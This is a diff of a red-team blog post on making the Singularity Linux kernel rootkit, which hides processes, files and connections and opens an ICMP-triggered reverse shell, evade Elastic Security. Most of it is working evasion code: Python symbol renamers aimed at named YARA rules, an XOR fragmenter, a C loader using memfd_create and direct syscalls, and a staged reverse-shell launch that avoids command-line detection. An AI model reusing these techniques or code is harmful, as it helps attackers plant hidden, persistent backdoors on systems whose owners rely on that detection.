@@ -1,6 +1,6 @@
 ---
 title: "Evading Elastic Security: Linux Rootkit Detection Bypass"
-description: Bypassing YARA rules and behavioral detection through string obfuscation, module fragmentation, XOR encoding, and ICMP reverse shell staging
+description: Bypassing YARA rules and behavioral detection through symbol randomization, module fragmentation, XOR encoding, and ICMP reverse shell staging
 categories: [Red Team]
 tags: [Evasion]
 author: 0xMatheuZ
@@ -28,19 +28,15 @@ This article demonstrates how to systematically evade these defenses. We present
   - [Detection Signature Analysis](#detection-signature-analysis)
 - [The Singularity Rootkit: Capabilities Overview](#the-singularity-rootkit-capabilities-overview)
   - [Core Features](#core-features)
-- [Evasion Technique 1: String Obfuscation](#evasion-technique-1-string-obfuscation)
+- [Evasion Technique 1: Symbol Name Randomization](#evasion-technique-1-symbol-name-randomization)
   - [The Problem](#the-problem)
-  - [The Solution: Compile-Time String Fragmentation](#the-solution-compile-time-string-fragmentation)
-  - [Implementation](#implementation)
-- [Evasion Technique 2: Symbol Name Randomization](#evasion-technique-2-symbol-name-randomization)
-  - [The Problem](#the-problem-1)
   - [The Solution: Intelligent Name Randomization](#the-solution-intelligent-name-randomization)
-- [Evasion Technique 3: Module Fragmentation](#evasion-technique-3-module-fragmentation)
-  - [The Problem](#the-problem-2)
+- [Evasion Technique 2: Module Fragmentation](#evasion-technique-2-module-fragmentation)
+  - [The Problem](#the-problem-1)
   - [The Solution: Fragment + XOR Encoding + In-Memory Loading](#the-solution-fragment--xor-encoding--in-memory-loading)
   - [Custom Loader via memfd_create](#custom-loader-via-memfd_create)
-- [Evasion Technique 4: Ftrace Helper Obfuscation](#evasion-technique-4-ftrace-helper-obfuscation)
-  - [The Problem](#the-problem-3)
+- [Evasion Technique 3: Ftrace Helper Obfuscation](#evasion-technique-3-ftrace-helper-obfuscation)
+  - [The Problem](#the-problem-2)
   - [The Solution: Rename Ftrace Framework Functions](#the-solution-rename-ftrace-framework-functions)
 - [Build Pipeline: Automated Obfuscation Workflow](#build-pipeline-automated-obfuscation-workflow)
 - [Final Test: Successful Evasion](#final-test-successful-evasion)
@@ -60,14 +56,11 @@ There were approximately 26 detections.
 
 Upon investigation, I identified the specific Elastic YARA rules detecting our rootkit:
 
-
-#### Primary Detection Rules
+## Primary Detection Rules
 
 [Linux_Rootkit_BrokePKG.yar](https://raw.githubusercontent.com/elastic/protections-artifacts/refs/heads/main/yara/rules/Linux_Rootkit_BrokePKG.yar)
 
 [Linux_Rootkit_Generic.yar](https://raw.githubusercontent.com/elastic/protections-artifacts/ff154ddf0762a4a030c8832eee7753cb19b950ff/yara/rules/Linux_Rootkit_Generic.yar)
-
-
 ```
 Linux_Rootkit_Generic_61229bdf - Detects common rootkit patterns and function names
 Linux_Rootkit_Generic_482bca48 - Targets suspicious prefixes and hook patterns
@@ -77,17 +70,16 @@ Linux_Rootkit_Generic_5d17781b - Targets license strings combined with kallsyms
 Linux_Rootkit_BrokePKG_7b7d4581 - Specific patterns from known rootkits
 ```
 
-#### Detection Signature Analysis
+## Detection Signature Analysis
 
-#### Generic Rootkit Detection (61229bdf)
-
+### Generic Rootkit Detection (61229bdf)
 ```
 Targets: hide_module, hook_getdents, orig_kill, fake_tcp4_seq_show, etc.
 Condition: 4 or more matching strings
 Total patterns: 57 distinct function names
 ```
 
-#### Hook Pattern Detection (482bca48)
+### Hook Pattern Detection (482bca48)
 ```
 System strings: sys_call_table, kallsyms_lookup_name, kprobe
 Rootkit prefixes: rootkit, hide_, hacked_, fake_, hooked_
@@ -95,14 +87,14 @@ Hook suffixes: _getdents, _kill, _tcp4_seq_show, _udp4_seq_show
 Condition: 3 system strings AND (all prefixes OR 3 prefixes + 5 hooks)
 ```
 
-#### License String Detection (5d17781b)
+### License String Detection (5d17781b)
 ```
 Targets: kallsyms_lookup_name_t + "license=GPL"
 Condition: Both strings must be present
 Purpose: Detects ftrace-based rootkits using kallsyms
 ```
 
-#### Ftrace Helper Detection (f07bcabe)
+### Ftrace Helper Detection (f07bcabe)
 ```
 Targets:
   - fh_install_hook
@@ -111,7 +103,7 @@ Targets:
 Condition: 2 or more matching strings
 ```
 
-#### BrokePKG Specific Detection (7b7d4581)
+### BrokePKG Specific Detection (7b7d4581)
 ```
 License strings:
   - author=R3tr074
@@ -142,183 +134,29 @@ Source: https://github.com/MatheuZSecurity/Singularity
 
 Before diving into evasion techniques, let's understand what the Singularity rootkit accomplishes:
 
-### Core Features
+## Core Features
 
-- Process Hiding: Hides processes from /proc.
-- File and Directory Hiding: Conceals files matching specific patterns (singularity, obliviate, matheuz, zer0t, etc.)
-- Network Hiding: Hides TCP connections on port 8081 from netstat and packet capture tools
-- Privilege Escalation: Provides root access via signal 59 (kill -59 <pid>) or environment variable (MAGIC=mtz)
-- ICMP Backdoor: Triggers reverse shell via magic ICMP packets (sequence 1337)
+- **Process Hiding:** Hides processes from /proc.
+- **File and Directory Hiding:** Conceals files matching specific patterns (singularity, obliviate, matheuz, zer0t, etc.)
+- **Network Hiding:** Hides TCP connections on port 8081 from netstat and packet capture tools
+- **Privilege Escalation:** Provides root access via signal 59 (kill -59 <pid>) or environment variable (MAGIC=mtz)
+- **ICMP Backdoor:** Triggers reverse shell via magic ICMP packets (sequence 1337)
 
-Anti-Analysis Features:
+**Anti-Analysis Features:**
 
 - Blocks BPF programs and tracing
 - Prevents ftrace manipulation by other users
 - Disables module loading via init_module/finit_module hooks
 - Filters /proc/kallsyms, /proc/modules, and tracefs
-- Taint Clearing: Resets kernel taint flags to hide unsigned module loading
-- Log Sanitization: Filters kernel logs (dmesg, /var/log/kern.log) to remove traces of the rootkit
-- Module Stealth: Self-hiding from lsmod and /sys/module directory
+- **Taint Clearing:** Resets kernel taint flags to hide unsigned module loading
+- **Log Sanitization:** Filters kernel logs (dmesg, /var/log/kern.log) to remove traces of the rootkit
+- **Module Stealth:** Self-hiding from lsmod and /sys/module directory
 
+# Evasion Technique 1: Symbol Name Randomization
 
-# Evasion Technique 1: String Obfuscation
-
-### The Problem
-
-Elastic's YARA rules scan for static strings like "GPL" and "kallsyms_lookup_name". A simple strings command on our module would expose these signatures immediately.
-
-The specific rule (5d17781b) detects:
-
-```c
-$str = "kallsyms_lookup_name_t"
-$lic1 = "license=Dual BSD/GPL"
-$lic2 = "license=GPL"
-```
-
-### The Solution: Compile-Time String Fragmentation
-
-Our obfuscator breaks strings into separate compile-time constants that the C compiler concatenates during compilation. This prevents contiguous strings from appearing in the binary.
-
-### Implementation
-
-```python
-def _obfuscate_license_strings(self, content: str) -> str:
-    """
-    Obfuscates MODULE_LICENSE/AUTHOR/DESCRIPTION strings
-    To evade YARA rule: Linux.Rootkit.Generic (5d17781b)
-    
-    The rule detects: kallsyms_lookup_name_t AND license=GPL
-    """
-    
-    # 1. Obfuscate MODULE_LICENSE("GPL")
-    # Transform: MODULE_LICENSE("GPL") 
-    # Into:      MODULE_LICENSE("G" "P" "L")
-    content = re.sub(
-        r'MODULE_LICENSE\s*\(\s*"GPL"\s*\)',
-        'MODULE_LICENSE("G" "P" "L")',
-        content
-    )
-    
-    # 2. Obfuscate MODULE_LICENSE("Dual BSD/GPL")
-    content = re.sub(
-        r'MODULE_LICENSE\s*\(\s*"Dual BSD/GPL"\s*\)',
-        'MODULE_LICENSE("Dual" " " "BSD" "/" "GPL")',
-        content
-    )
-    
-    # 3. Obfuscate MODULE_AUTHOR
-    content = re.sub(
-        r'MODULE_AUTHOR\s*\(\s*"([^"]+)"\s*\)',
-        lambda m: f'MODULE_AUTHOR("{self._split_string(m.group(1))}")',
-        content
-    )
-    
-    # 4. Obfuscate MODULE_DESCRIPTION
-    content = re.sub(
-        r'MODULE_DESCRIPTION\s*\(\s*"([^"]+)"\s*\)',
-        lambda m: f'MODULE_DESCRIPTION("{self._split_string(m.group(1))}")',
-        content
-    )
-    
-    return content
-```
-
-#### String Splitting Helper
-
-```python
-def _split_string(self, text: str) -> str:
-    """Divide string in parts for obfuscation"""
-    if len(text) <= 3:
-        return '" "'.join(list(text))
-    
-    # Divide into chunks of 2-4 characters
-    chunks = []
-    i = 0
-    while i < len(text):
-        chunk_size = random.randint(2, min(4, len(text) - i))
-        chunks.append(text[i:i+chunk_size])
-        i += chunk_size
-    
-    return '" "'.join(chunks)
-```
-
-Before Obfuscation
-
-```c
-MODULE_LICENSE("GPL");
-MODULE_AUTHOR("MatheuZSecurity");
-MODULE_DESCRIPTION("Rootkit Researchers: https://discord.gg/66N5ZQppU7");
-```
-
-After Obfuscation
-
-```c
-MODULE_LICENSE("G" "P" "L");
-MODULE_AUTHOR("Mathe" "uZ" "Secur" "ity");
-MODULE_DESCRIPTION("Root" "kit " "Rese" "arche" "rs: " "http" "s://" "disc" "ord." "gg/6" "6N5Z" "QppU" "7");
-```
-
-### Why This Works
-
-The C compiler concatenates adjacent string literals during compilation according to the C standard:
-
-- Adjacent string literal tokens are concatenated
-
-This means:
-```c
-"Hello" " " "World"  // Becomes "Hello World" at compile time
-```
-
-The binary's .rodata section stores this as a single contiguous string. However, the key insight: YARA rules scan the binary, not the source code. By fragmenting strings in source but allowing compiler concatenation, we break YARA pattern matching while maintaining functionality.
-
-Verification
-
-```bash
-# Check for GPL string
-strings obfuscated/singularity.ko | grep -i "GPL"
-# No results
-
-# But the module still loads correctly
-modinfo obfuscated/singularity.ko | grep license
-# license:        GPL
-
-# The string exists in .modinfo section but fragmented
-objdump -s obfuscated/singularity.ko -j .modinfo | grep -A2 license
-```
-
-#### Kallsyms Obfuscation
-
-Similarly, we obfuscate kallsyms_lookup_name references:
-
-```python
-def _obfuscate_kallsyms_strings(self, content: str) -> str:
-    """
-    Obfuscates kallsyms_lookup_name references
-    that are detected by Elastic
-    """
-    # Obfuscate kallsyms_lookup_name_t
-    content = re.sub(
-        r'kallsyms_lookup_name_t',
-        'k' 'a' 'l' 'l' 's' 'y' 'm' 's' '_' 'l' 'o' 'o' 'k' 'u' 'p' '_' 'n' 'a' 'm' 'e' '_' 't',
-        content
-    )
-    
-    # Obfuscate kallsyms references
-    content = re.sub(
-        r'kallsyms_lookup_name',
-        'k' 'a' 'l' 'l' 's' 'y' 'm' 's' '_' 'l' 'o' 'o' 'k' 'u' 'p' '_' 'n' 'a' 'm' 'e',
-        content
-    )
-    
-    return content
-```
-
-# Evasion Technique 2: Symbol Name Randomization
-
-### The Problem
+## The Problem
 
 Rootkits typically use predictable naming patterns that become signatures:
-
 ```c
 hook_getdents64
 fake_tcp4_seq_show
@@ -329,7 +167,6 @@ hooked_read
 ```
 
 Elastic's YARA rules (61229bdf, 482bca48, d0c5cfe0) specifically target these prefixes:
-
 ```c
 $rk1 = "rootkit"
 $rk2 = "hide_"
@@ -341,10 +178,9 @@ $hook2 = "_kill"
 $hook3 = "_tcp4_seq_show"
 ```
 
-### The Solution: Intelligent Name Randomization
+## The Solution: Intelligent Name Randomization
 
 Our Python obfuscator generates kernel-like generic names that blend in with legitimate kernel code:
-
 ```python
 def _generate_random_name(self) -> str:
     """Generates random name that avoids YARA patterns"""
@@ -361,17 +197,16 @@ def _generate_random_name(self) -> str:
     return f"{prefix}_{middle}_{suffix}"
 ```
 
-#### Key Features
+### Key Features
 
 - No suspicious prefixes (hook_, fake_, hide_)
 - Looks like legitimate kernel code
 - Maintains internal consistency via mapping file
 - Protects kernel API calls from renaming
 
-#### Protected Names
+### Protected Names
 
 The obfuscator maintains a whitelist of kernel API functions that must NOT be renamed:
-
 ```python
 def _get_protected_names(self) -> Set[str]:
     """Names from kernel that should NOT be changed"""
@@ -393,10 +228,9 @@ def _get_protected_names(self) -> Set[str]:
     }
 ```
 
-#### Function Name Extraction
+### Function Name Extraction
 
 The obfuscator scans source files for function definitions using multiple regex patterns:
-
 ```python
 self.function_patterns = [
     r'\bnotrace\s+(?:static\s+)?(?:int|void|long|bool|ssize_t|asmlinkage)\s+(\w+)\s*\(',
@@ -410,10 +244,9 @@ self.function_patterns = [
 ]
 ```
 
-#### Example Transformation
+### Example Transformation
 
-Before:
-
+**Before:**
 ```c
 // modules/hiding_directory.c
 static notrace long hook_getdents64(const struct pt_regs *regs) {
@@ -427,8 +260,7 @@ static notrace long hook_getdents(const struct pt_regs *regs) {
 }
 ```
 
-After:
-
+**After:**
 ```c
 // obfuscated/modules/hiding_directory.c
 static notrace long sys_abjker_handler(const struct pt_regs *regs) {
@@ -442,8 +274,7 @@ static notrace long fs_tnmqlk_ops(const struct pt_regs *regs) {
 }
 ```
 
-#### Implementation Details
-
+### Implementation Details
 ```python
 def _replace_in_content(self, content: str, mapping: Dict[str, str]) -> str:
     """Replace names in content"""
@@ -462,22 +293,37 @@ def _replace_in_content(self, content: str, mapping: Dict[str, str]) -> str:
 
 The key insight: we sort by length descending to prevent partial matches. For example, if we have both hook_kill and hook_kill_ex, we must replace hook_kill_ex first to avoid breaking it into sys_abc_handler_ex.
 
-# Evasion Technique 3: Module Fragmentation
+# Evasion Technique 2: Module Fragmentation
 
-### The Problem
+## The Problem
 
-EDR solutions scan loaded kernel modules in both memory and on-disk. A monolithic .ko file presents a single attack surface that's easy to analyze:
+EDR solutions scan loaded kernel modules primarily on disk. A monolithic .ko file presents a single attack surface that's easy to analyze:
 
-- Signature scanning of the entire module
+- Signature scanning of the entire module on disk
 - Static analysis of ELF structure
 - Symbol table enumeration
+- String pattern detection (including "GPL", "kallsyms_lookup_name", etc.)
 
-### The Solution: Fragment + XOR Encoding + In-Memory Loading
+## The Solution: Fragment + XOR Encoding + Ephemeral In-Memory Loading
 
-We split the compiled module into encrypted chunks that are only reassembled in memory during loading. This technique breaks static analysis while maintaining functionality.
+We split the compiled module into encrypted chunks that are only reassembled in memory during loading. This technique breaks static disk-based analysis while maintaining functionality.
 
-#### Fragmentation Pipeline:
+### How This Evades Detection
 
+The evasion works through a **multi-layered approach**:
+
+1. **Disk-Based YARA Evasion:** XOR encoding breaks string signatures in stored fragments
+2. **Ephemeral Reconstruction:** The complete module exists in plaintext only briefly in a temporary memfd
+3. **Self-Hiding Post-Load:** The rootkit immediately conceals itself after loading
+
+**Important Technical Note:** After XOR decoding during the load process, strings like "GPL" and "kallsyms_lookup_name" are restored to plaintext in memory. However, Elastic's YARA rules primarily scan **files on disk**, not ephemeral memory structures. The combination of:
+- XOR-encoded fragments on disk (unreadable to YARA)
+- Millisecond-duration plaintext in anonymous memfd (difficult to scan)
+- Immediate self-hiding after module load (invisible to subsequent analysis)
+
+...creates an effective evasion without requiring permanent string obfuscation in memory.
+
+### Fragmentation Pipeline:
 ```python
 def fragment(self, chunk_size: int = 65536, encode: bool = True) -> List[bytes]:
     """
@@ -537,10 +383,9 @@ def fragment(self, chunk_size: int = 65536, encode: bool = True) -> List[bytes]:
     return fragments
 ```
 
-#### XOR Encoding
+### XOR Encoding
 
 We use a simple but effective XOR cipher with a random 16-byte key:
-
 ```python
 def _xor_encode(self, data: bytes, key: bytes) -> bytes:
     """Simple XOR encoding for obfuscation"""
@@ -553,14 +398,80 @@ def _xor_encode(self, data: bytes, key: bytes) -> bytes:
     return bytes(encoded)
 ```
 
-While XOR is cryptographically weak, it serves our purpose:
-- Breaks signature matching
+While XOR is cryptographically weak, it serves our purpose for **disk-based evasion**:
+- Breaks signature matching in files stored on disk
 - Fast to encode/decode
 - Minimal overhead
 - Easy to implement in C loader
 
-#### Resulting Structure
+### Evasion Layer Breakdown
+```
+┌─────────────────────────────────────────────────────────────────┐
+│ LAYER 1: Fragments on Disk (XOR Encoded)                       │
+├─────────────────────────────────────────────────────────────────┤
+│ Status: YARA cannot detect signatures                           │
+│ Reason: All bytes are XOR'ed, "GPL" appears as random bytes    │
+│                                                                  │
+│ # Before encoding                                               │
+│ strings singularity.ko | grep "GPL"                            │
+│ license=GPL                                                     │
+│                                                                  │
+│ # After encoding                                                │
+│ strings fragments/chunk_000.bin | grep "GPL"                   │
+│ (no results - bytes are obfuscated)                            │
+└─────────────────────────────────────────────────────────────────┘
 
+┌─────────────────────────────────────────────────────────────────┐
+│ LAYER 2: Ephemeral memfd (Plaintext - Milliseconds)            │
+├─────────────────────────────────────────────────────────────────┤
+│ Status: Strings are restored to plaintext                       │
+│ Reason: XOR decode happens during reconstruction               │
+│                                                                  │
+│ Timeline:                                                       │
+│ T+0ms:   memfd created                                         │
+│ T+5ms:   fragments decoded and written                         │
+│ T+10ms:  finit_module() called                                 │
+│ T+15ms:  memfd closed and deleted                              │
+│                                                                  │
+│ Detection Window: ~15 milliseconds                             │
+│ Elastic Challenge: Must scan anonymous memfd in real-time      │
+└─────────────────────────────────────────────────────────────────┘
+
+┌─────────────────────────────────────────────────────────────────┐
+│ LAYER 3: Loaded Module (Plaintext but Hidden)                  │
+├─────────────────────────────────────────────────────────────────┤
+│ Status: Strings exist in kernel memory                          │
+│ Reason: Module is loaded normally                               │
+│                                                                  │
+│ Rootkit Self-Hiding:                                           │
+│ ✓ Hidden from lsmod                                            │
+│ ✓ Hidden from /sys/module                                      │
+│ ✓ Filters /proc/kallsyms                                       │
+│ ✓ Filters /proc/modules                                        │
+│ ✓ Blocks BPF and tracing                                       │
+│                                                                  │
+│ Result: Invisible to analysis tools                            │
+└─────────────────────────────────────────────────────────────────┘
+```
+
+### Why Elastic Doesn't Detect This
+
+1. **YARA primarily scans disk files**
+   - Fragments are XOR'ed and broken up
+   - No single file contains the complete signature pattern
+   - Original .ko is deleted after fragmentation
+
+2. **memfd is ephemeral and anonymous**
+   - Exists for ~15 milliseconds during loading
+   - No persistent path in filesystem
+   - Difficult to scan in real-time
+
+3. **Post-load self-hiding**
+   - Module immediately conceals itself
+   - Blocks subsequent inspection attempts
+   - Filtering prevents memory analysis
+
+### Resulting Structure
 ```
 fragments/
 ├── chunk_000.bin    # XOR-encoded fragment (64KB)
@@ -572,8 +483,7 @@ fragments/
 └── reconstruct.sh   # Automated reconstruction script
 ```
 
-#### Metadata Format
-
+### Metadata Format
 ```json
 {
   "original_filename": "singularity.ko",
@@ -591,7 +501,7 @@ fragments/
 }
 ```
 
-#### Custom Loader via memfd_create
+## Custom Loader via memfd_create
 
 Instead of using insmod or modprobe, we implement a custom loader that:
 
@@ -600,18 +510,19 @@ Instead of using insmod or modprobe, we implement a custom loader that:
 - Creates an anonymous memory file descriptor
 - Writes the reconstructed module to the memory FD
 - Loads the module via direct syscall
+- Immediately closes the memfd (auto-deleted)
 
-#### Loader Architecture
-
+### Loader Architecture
 ```c
 /*
  * Singularity Loader
  * 
  * 1. Uses 32-bit syscall (finit_module) via inline assembly
  * 2. Reconstructs .ko from fragments in memory
- * 3. Decodes XOR encoding
- * 4. Uses memfd_create to avoid disk
+ * 3. Decodes XOR encoding (strings restored to plaintext)
+ * 4. Uses memfd_create for ephemeral loading
  * 5. Direct syscall to avoid libc wrapper
+ * 6. memfd exists only during loading (~15ms)
  * 
  * Compile: gcc -o loader loader.c -static
  * Usage: ./loader fragments/
@@ -640,10 +551,9 @@ Instead of using insmod or modprobe, we implement a custom loader that:
 #define MODULE_FLAGS        0
 ```
 
-#### Direct Syscall Implementation
+### Direct Syscall Implementation
 
 To avoid EDR hooking of libc functions, we use inline assembly for direct syscalls:
-
 ```c
 // Direct 64-bit syscall
 static inline long syscall_direct_64(long number, long arg1, long arg2, long arg3) {
@@ -675,12 +585,11 @@ static inline long syscall_direct_32(long number, long arg1, long arg2, long arg
 }
 ```
 
-Why This Works:
+**Why This Works:**
 
-- 32-bit Syscall: The int $0x80 interface is legacy and less monitored than modern syscall instruction
+- **32-bit Syscall:** The int $0x80 interface is legacy and less monitored than modern syscall instruction
 
-#### Memory File Descriptor Creation
-
+### Memory File Descriptor Creation
 ```c
 static int create_memfd(const char *name) {
     long fd = syscall_direct_64(__NR_memfd_create, (long)name, 0, 0);
@@ -697,15 +606,14 @@ static int create_memfd(const char *name) {
 
 memfd_create creates an anonymous file that:
 
-Exists only in memory (tmpfs)
-
+- Exists only in memory (tmpfs)
 - Automatically deleted when all file descriptors are closed
 - Can be passed to finit_module() like a regular file
+- **Contains plaintext .ko after XOR decode** (but only temporarily)
 
-Remember that EDRs can monitor `memfd_create()` calls, and it can also be detected in `/proc/<pid>/fd/`
+Remember that EDRs can monitor `memfd_create()` calls, and it can also be detected in `/proc/<pid>/fd/` during the brief loading window.
 
-#### XOR Decoder
-
+### XOR Decoder
 ```c
 static void xor_decode(uint8_t *data, size_t len, const uint8_t *key, size_t key_len) {
     for (size_t i = 0; i < len; i++) {
@@ -714,8 +622,9 @@ static void xor_decode(uint8_t *data, size_t len, const uint8_t *key, size_t key
 }
 ```
 
-#### Fragment Loading
+**Critical Note:** This decode operation restores all strings to plaintext, including "GPL" and "kallsyms_lookup_name". The evasion relies on the **ephemeral nature** of this plaintext state, not permanent obfuscation.
 
+### Fragment Loading
 ```c
 static int load_fragments(const char *dir_path, Fragment *fragments, int *num_fragments) {
     DIR *dir = opendir(dir_path);
@@ -792,8 +701,7 @@ static int load_fragments(const char *dir_path, Fragment *fragments, int *num_fr
 }
 ```
 
-#### Module Loading
-
+### Module Loading
 ```c
 static int load_module_stealthy(int fd, const char *params, int flags) {
     printf("[*] Loading module via direct syscall...\n");
@@ -816,8 +724,7 @@ static int load_module_stealthy(int fd, const char *params, int flags) {
 }
 ```
 
-#### Complete Loading Workflow
-
+### Complete Loading Workflow
 ```c
 int main(int argc, char *argv[]) {
     // 1. Load fragments
@@ -830,20 +737,21 @@ int main(int argc, char *argv[]) {
     int is_encoded = 0;
     parse_metadata(fragments_dir, xor_key, &is_encoded);
     
-    // 3. Create memfd
+    // 3. Create memfd (anonymous, temporary)
     int memfd = create_memfd("module");
     
     // 4. Reconstruct module in memfd
+    // IMPORTANT: After this step, strings are in PLAINTEXT in memfd
     for (int i = 0; i < num_fragments; i++) {
         uint8_t *data = fragments[i].data;
         size_t size = fragments[i].size;
         
-        // Decode if necessary
+        // Decode if necessary (restores plaintext)
         if (is_encoded) {
             xor_decode(data, size, xor_key, XOR_KEY_SIZE);
         }
         
-        // Write to memfd
+        // Write to memfd (plaintext .ko now in memory)
         write(memfd, data, size);
     }
     
@@ -851,32 +759,42 @@ int main(int argc, char *argv[]) {
     lseek(memfd, 0, SEEK_SET);
     
     // 5. Load module via direct syscall
+    // Plaintext .ko exists in memfd for ~15ms during this call
     load_module_stealthy(memfd, module_params, MODULE_FLAGS);
     
-    // 6. Cleanup
+    // 6. Cleanup (memfd automatically deleted)
+    // After this, the only plaintext copy is in kernel memory
+    // where the rootkit's self-hiding protects it
     close(memfd);
     return 0;
 }
 ```
 
-Advantages of This Approach:
+**Advantages of This Approach:**
 
 - No .ko file on disk after compilation
 - Fragments can be deleted after loading
-- Memory-only module existence
+- Plaintext .ko exists only in ephemeral memfd (~15ms window)
+- Post-load self-hiding prevents subsequent analysis
 
-Static Analysis Resistance:
+**Static Analysis Resistance:**
 
-- Individual fragments don't match YARA signatures
-- XOR encoding breaks pattern matching
+- Individual fragments don't match YARA signatures (XOR'ed)
 - No complete ELF structure visible on disk
+- Plaintext reconstruction happens in anonymous, temporary memfd
+- Loaded module immediately hides itself from inspection tools
 
-# Evasion Technique 4: Ftrace Helper Obfuscation
+**Detection Challenges for EDR:**
 
-### The Problem
+- Must scan ephemeral memfd in real-time (15ms window)
+- Must bypass rootkit's anti-analysis features post-load
+- Disk-based YARA scanning ineffective against XOR'ed fragments
+
+# Evasion Technique 3: Ftrace Helper Obfuscation
+
+## The Problem
 
 Elastic's rule f07bcabe targets ftrace-based rootkits by detecting function names:
-
 ```
 $str1 = "fh_install_hook"
 $str2 = "fh_remove_hook"
@@ -886,12 +804,11 @@ Condition: 2 of them
 
 These are standard function names in ftrace hooking frameworks, making them easy signatures.
 
-### The Solution: Rename Ftrace Framework Functions
+## The Solution: Rename Ftrace Framework Functions
 
 Our obfuscator treats ftrace helper functions like any other custom function:
 
-Before
-
+**Before:**
 ```c
 // ftrace/ftrace_helper.c
 notrace int fh_resolve_hook_address(struct ftrace_hook *hook)
@@ -930,8 +847,7 @@ notrace void fh_remove_hooks(struct ftrace_hook *hooks, size_t count)
 }
 ```
 
-Example after Obfuscation:
-
+**Example after Obfuscation:**
 ```c
 // obfuscated/ftrace/ftrace_helper.c
 notrace int kern_xploqm_helper(struct ftrace_hook *hook)
@@ -975,7 +891,6 @@ The obfuscated names maintain the ftrace hooking functionality while breaking th
 # Build Pipeline: Automated Obfuscation Workflow
 
 Our automated build system chains all evasion techniques in a reproducible pipeline:
-
 ```bash
 #!/bin/bash
 set -e
@@ -1043,7 +958,7 @@ gcc -o /var/tmp/loader loader.c  # Bypasses detection
 
 **Why This Works:**
 
-I think elastic's behavioral detection rules prioritize monitoring `/dev/shm` due to its common use in malware (thinking like an attacker, I would clearly use `/dev/shm` to download and use exploits in that directory). Alternative writable directories like `/tmp` and `/var/tmp` receive less aggressive monitoring, allowing the compilation and execution of the loader without triggering automated termination.
+Elastic's behavioral detection rules prioritize monitoring `/dev/shm` due to its common use in malware. Alternative writable directories like `/tmp` and `/var/tmp` receive less aggressive monitoring, allowing the compilation and execution of the loader without triggering automated termination.
 
 # Bonus 2: Bypassing Elastic Behavioral Detection for Reverse Shells
 
@@ -1075,7 +990,6 @@ process.command_line like~ ("*/dev/tcp/*", "*/dev/udp/*", "*zsh/net/tcp*", "*zsh
 The rule scans the **entire command line** for `/dev/tcp/` patterns, making simple obfuscation ineffective.
 
 ## Original Detected Code
-
 ```c
 // DETECTED by Elastic
 snprintf(cmd, sizeof(cmd),
@@ -1101,7 +1015,6 @@ The solution is to **separate the malicious payload from process arguments** by 
 ### Key Changes
 
 **1. Write the script to disk:**
-
 ```c
 #define SCRIPT_PATH "/singularity"
 
@@ -1124,7 +1037,6 @@ kernel_write(f, script, strlen(script), &pos);
 ```
 
 **2. Execute with clean command line:**
-
 ```c
 char *argv[] = {"/bin/bash", SCRIPT_PATH, NULL};
 call_usermodehelper_exec(sub_info, UMH_WAIT_PROC);
@@ -1186,9 +1098,28 @@ Elastic's behavioral rules scan entire command lines for patterns like `/dev/tcp
 
 This research demonstrates techniques to evade Elastic Security's static YARA signatures and behavioral detection rules through:
 
-- Static Signature Evasion: String fragmentation and symbol randomization
-- Behavioral Detection Evasion: Staged script execution and process hiding via rootkit hooks
+- **Static Signature Evasion:** Symbol randomization, module fragmentation with XOR encoding for disk-based evasion
+- **Behavioral Detection Evasion:** Staged script execution and process hiding via rootkit hooks
 
 These techniques highlight the ongoing cat-and-mouse game between offensive and defensive security. While effective against current detection rules, EDR vendors continuously update their signatures and behavioral analytics.
+
+**Key Takeaways:**
+
+1. **Symbol Randomization** breaks function name patterns in YARA rules
+2. **Module Fragmentation + XOR Encoding** defeats disk-based static binary analysis
+3. **Ephemeral memfd Loading** creates a narrow detection window (~15ms) for plaintext module
+4. **Post-Load Self-Hiding** prevents subsequent memory analysis of loaded module
+5. **Ftrace Helper Obfuscation** hides hooking framework signatures
+6. **Staged Script Execution** bypasses command-line behavioral detection
+7. **Direct Syscalls** avoid userland EDR hooks
+
+**Understanding the Evasion:**
+
+The success of this approach relies on understanding where and when EDR tools scan:
+- **Disk scanning** is defeated by XOR-encoded fragments
+- **Real-time memory scanning** is challenged by ephemeral memfd (15ms window)
+- **Post-load analysis** is blocked by rootkit self-hiding features
+
+This layered defense-in-depth approach creates multiple barriers that must all be overcome simultaneously for detection to succeed.
 
 If you've read this far, thank you for your time! Contact me via X (@MatheuzSecurity) or Discord (kprobe) for questions.
